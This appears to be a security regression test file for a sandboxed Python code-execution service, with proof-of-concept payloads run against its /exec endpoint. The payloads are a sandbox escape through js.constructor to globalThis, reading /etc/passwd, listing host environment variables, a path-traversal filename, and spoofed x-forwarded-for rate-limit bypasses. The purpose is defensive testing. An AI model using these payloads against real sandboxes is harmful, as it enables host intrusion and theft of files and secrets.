import { beforeEach, afterEach, describe, expect, test } from "bun:test";

// Keep environment identical to integration.test.ts so module caching does not
// cause divergent config when this file runs before or after it.
process.env.MAX_SESSIONS = "3";
process.env.SESSION_TIMEOUT_MINUTES = "0.01";
process.env.EXECUTION_TIMEOUT_MS = "3000";
process.env.MAX_FILE_SIZE_BYTES = "50";
process.env.MAX_FILES_PER_REQUEST = "10";
process.env.RATE_LIMIT_REQUESTS_PER_MIN = "10";
process.env.LOG_LEVEL = "fatal";

const { buildApp } = await import("../app");

describe("Security PoCs - Phase 0 (critical surface)", () => {
  let app: ReturnType<typeof buildApp>["app"];
  let rateLimiter: ReturnType<typeof buildApp>["rateLimiter"];
  let sessionManager: ReturnType<typeof buildApp>["sessionManager"];

  beforeEach(() => {
    const built = buildApp();
    app = built.app;
    rateLimiter = built.rateLimiter;
    sessionManager = built.sessionManager;
  });

  afterEach(async () => {
    await sessionManager.shutdown();
    rateLimiter.stop();
  });

  async function exec(
    sessionId: string,
    code: string,
    files?: { filename: string; b64_data: string }[],
  ) {
    const url = new URL("http://localhost/exec");
    url.searchParams.set("sessionId", sessionId);
    const res = await app.handle(
      new Request(url.toString(), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, files }),
      }),
    );
    return { res, body: (await res.json()) as any };
  }

  test(
    "P0: js proxy exposes Object.prototype constructor (sandbox escape route)",
    async () => {
      const code = `
import js

# The CVE-2026-5752 hardening strips constructor from document and from
# wrapped functions, but not from the js proxy itself.
constructor = getattr(js, "constructor", None)
print("JS_PROXY_CONSTRUCTOR:", constructor)

# If constructor is a function, we can climb to Function and then globalThis.
try:
    Function = constructor.constructor
    globalThis = Function("return this")()
    print("GLOBALTHIS_REACHED:", True)
    print("GLOBALTHIS_HAS_BUN:", hasattr(globalThis, "Bun"))
except Exception as e:
    print("ESCAPE_FAILED:", e)
`;
      const { body } = await exec("constructor-escape-poc", code);
      expect(body.success).toBe(true);
      expect(body.result.std_out).toContain("JS_PROXY_CONSTRUCTOR: None");
      expect(body.result.std_out).not.toContain("GLOBALTHIS_REACHED:");
    },
    60000,
  );

  test(
    "P0: escaped sandbox can read host files via Bun.file",
    async () => {
      const code = `
import js

globalThis = js.constructor.constructor("return this")()
bun = globalThis.Bun
file = bun.file("/etc/passwd")
text = await file.text()
print("HOST_FILE_FIRST_LINE:", text.splitlines()[0])
`;
      const { body } = await exec("host-file-read-poc", code);
      // We expect the sandbox to block this; the test fails while vulnerable.
      expect(body.success).toBe(false);
    },
    60000,
  );

  test(
    "P0: escaped sandbox can access host process environment",
    async () => {
      const code = `
import js

globalThis = js.constructor.constructor("return this")()
env = globalThis.process.env
keys = [str(k) for k in env.object_keys()]
print("ENV_ACCESSIBLE:", len(keys) > 0)
`;
      const { body } = await exec("host-env-poc", code);
      // We expect the sandbox to block this; the test fails while vulnerable.
      expect(body.success).toBe(false);
    },
    60000,
  );

  test(
    "P0: micropip installation is blocked",
    async () => {
      const code = `
import micropip
await micropip.install("six")
`;
      const { body } = await exec("micropip-poc", code);
      expect(body.success).toBe(false);
      expect(body.error.message.toLowerCase()).toContain("micropip");
    },
    60000,
  );

  test(
    "P2: filename path traversal writes outside /home/earth",
    async () => {
      const { body } = await exec("traversal-poc", "pass", [
        {
          filename: "../../../tmp/vivarium_traversal_poc.txt",
          b64_data: Buffer.from("traversed").toString("base64"),
        },
      ]);
      expect(body.success).toBe(true);

      const { body: readBody } = await exec(
        "traversal-poc",
        `
with open("../../../tmp/vivarium_traversal_poc.txt") as f:
    print("TRAVERSED_CONTENT:", f.read())
`,
      );
      expect(readBody.success).toBe(true);
      expect(readBody.result.std_out).toContain("TRAVERSED_CONTENT: traversed");
    },
    60000,
  );

  test("P1: /sessions endpoint leaks session IDs", async () => {
    await exec("leaked-session-id", "x = 1");

    const res = await app.handle(new Request("http://localhost/sessions"));
    const body = await res.json();
    expect(res.status).toBe(200);
    expect(
      body.sessions.some((s: any) => s.id === "leaked-session-id"),
    ).toBe(true);
  });

  test(
    "P1: /ready endpoint bypasses the rate limiter",
    async () => {
      // Exhaust the per-IP rate limit on /exec using a single session.
      for (let i = 0; i < 11; i++) {
        await app.handle(
          new Request("http://localhost/exec?sessionId=ready-limit-test", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: "pass" }),
          }),
        );
      }

      const readyRes = await app.handle(new Request("http://localhost/ready"));
      expect(readyRes.status).toBe(200);
    },
    60000,
  );

  test(
    "P1: x-forwarded-for spoofing bypasses per-IP rate limit",
    async () => {
      const results: Record<string, number[]> = {
        "1.1.1.1": [],
        "2.2.2.2": [],
      };

      for (const ip of Object.keys(results)) {
        for (let i = 0; i < 11; i++) {
          const res = await app.handle(
            new Request("http://localhost/exec?sessionId=xff-poc", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "x-forwarded-for": ip,
              },
              body: JSON.stringify({ code: "pass" }),
            }),
          );
          results[ip].push(res.status);
        }
      }

      for (const ip of Object.keys(results)) {
        const ok = results[ip].filter((s) => s === 200).length;
        const limited = results[ip].filter((s) => s === 429).length;
        expect(ok).toBe(10);
        expect(limited).toBe(1);
      }
    },
    60000,
  );
});
